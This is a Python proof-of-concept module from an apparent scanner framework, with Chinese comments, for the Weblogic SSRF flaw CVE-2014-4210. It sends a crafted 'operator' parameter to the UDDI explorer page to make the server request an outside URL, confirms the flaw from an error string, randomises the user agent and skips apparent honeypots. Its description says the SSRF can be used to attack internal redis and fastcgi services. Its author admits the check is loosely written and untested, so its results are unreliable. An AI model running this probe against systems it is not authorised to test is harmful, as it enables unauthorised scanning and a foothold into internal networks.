# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2021-06-09",        # POC创建时间
        "UpdateDate" : "2021-06-09",        # POC创建时间
        "PocDesc" : """
            不一定准哈，笔者是找着描述随意写的，没怎么测试
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Weblogic SSRF (CVE-2014-4210)",                        # 漏洞名称
        "VulnID" : "CVE-2014-4210",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "Weblogic",                     # 漏洞应用名称
        "AppVersion" : "10.0.2,10.3.6",                  # 漏洞应用版本
        "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Weblogic中存在一个SSRF漏洞，
            利用该漏洞可以发送任意HTTP请求，
            进而攻击内网中redis、fastcgi等脆弱组件。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "/uddiexplorer/SearchPublicRegistries.jsp" # url自己按需调整
        url1 = self.target + "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=https://www.baidu.com" # url自己按需调整

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req0.status_code == 200 and "Search by business name" in req0.text:

                req1 = requests.get(url1,headers = headers , proxies = self.proxy ,timeout = 20,verify = False)
                if "weblogic.uddi.client.structures.exception.XML_SoapException" in req1.text:
                    vuln = [True,req1.text]
                else:
                    vuln = [False,req1.text]
            else:
                vuln = [False,req0.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()